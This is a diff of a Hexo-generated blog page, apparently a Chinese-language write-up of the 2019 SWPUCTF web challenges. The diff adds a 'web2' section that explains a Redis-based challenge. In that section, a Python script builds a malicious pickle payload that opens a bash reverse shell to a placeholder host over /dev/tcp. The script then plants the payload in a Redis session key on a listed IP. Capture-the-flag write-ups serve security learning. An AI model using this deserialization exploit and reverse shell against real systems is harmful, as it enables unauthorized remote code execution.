@@ -67,7 +67,7 @@
 <meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;12&#x2F;16&#x2F;2019SWPUCTF-web%E9%A2%98%E8%A7%A3&#x2F;1576504750757.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;12&#x2F;16&#x2F;2019SWPUCTF-web%E9%A2%98%E8%A7%A3&#x2F;1576504867049.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;12&#x2F;16&#x2F;2019SWPUCTF-web%E9%A2%98%E8%A7%A3&#x2F;1576504959852.png">
-<meta property="og:updated_time" content="2019-12-16T14:03:17.201Z">
+<meta property="og:updated_time" content="2019-12-17T08:55:07.702Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;12&#x2F;16&#x2F;2019SWPUCTF-web%E9%A2%98%E8%A7%A3&#x2F;1576504645263.png">
   <link rel="canonical" href="https://li1m.github.io/2019/12/16/2019SWPUCTF-web%E9%A2%98%E8%A7%A3/">
@@ -298,11 +298,19 @@
                 
               
 
-              <time title="Created: 2019-12-16 21:16:27 / Modified: 22:03:17" itemprop="dateCreated datePublished" datetime="2019-12-16T21:16:27+08:00">2019-12-16</time>
+              <time title="Created: 2019-12-16 21:16:27" itemprop="dateCreated datePublished" datetime="2019-12-16T21:16:27+08:00">2019-12-16</time>
             </span>
           
             
 
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-12-17 16:55:07" itemprop="dateModified" datetime="2019-12-17T16:55:07+08:00">2019-12-17</time>
+              </span>
             
           
 
@@ -323,7 +331,7 @@
               
                 <span class="post-meta-item-text">Symbols count in article: </span>
               
-              <span>923</span>
+              <span>1.3k</span>
             </span>
           
             <span class="post-meta-item" title="Reading time">
@@ -351,6 +359,9 @@
 
 <p>下面给些图理解<br><img src="1576504645263.png" alt="1576504645263"></p>
 <p><img src="1576504750757.png" alt="1576504750757"><br><img src="1576504867049.png" alt="1576504867049"><br><img src="1576504959852.png" alt="1576504959852"></p>
+<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>登录源码提示redis，redis-cli -h host -p 6379可以链接redis库，弹个shell，找到flag。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">		s = <span class="string">"bash -i &gt;&amp; /dev/tcp/xx/xx 0&gt;&amp;1"</span></span><br><span class="line">		<span class="keyword">return</span> (os.system, (s,))</span><br><span class="line">e = exp()</span><br><span class="line">s = cPickle.dumps(e)</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line">r = redis.Redis(host=<span class="string">'114.67.109.247'</span>,password=<span class="string">"password"</span>, port=<span class="number">6379</span>, db=<span class="number">0</span>)</span><br><span class="line">r.set(<span class="string">"session:your_session"</span>, s)</span><br></pre></td></tr></table></figure>
+
 
     </div>
 
@@ -387,6 +398,10 @@
             <span class="post-nav-divider"></span>
 
             <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2019/12/22/2019GXYCTFwebf%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" rel="prev" title="2019-GXYCTFwebf部分题解">
+                  2019-GXYCTFwebf部分题解 <i class="fa fa-chevron-right"></i>
+                </a>
               
             </div>
           </div>
@@ -432,7 +447,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web1"><span class="nav-number">1.</span> <span class="nav-text">web1</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web1"><span class="nav-number">1.</span> <span class="nav-text">web1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web2"><span class="nav-number">2.</span> <span class="nav-text">web2</span></a></li></ol></div>
         
       </div>
       <!--/noindex-->
@@ -448,7 +463,7 @@
         
           <a href="/archives/">
         
-          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-count">14</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -498,14 +513,14 @@
     </span>
       <span class="post-meta-item-text">Symbols count total: </span>
     
-    <span title="Symbols count total">55k</span>
+    <span title="Symbols count total">56k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">Reading time total &asymp;</span>
     
-    <span title="Reading time total">50 mins.</span>
+    <span title="Reading time total">51 mins.</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.0.0
   </div>
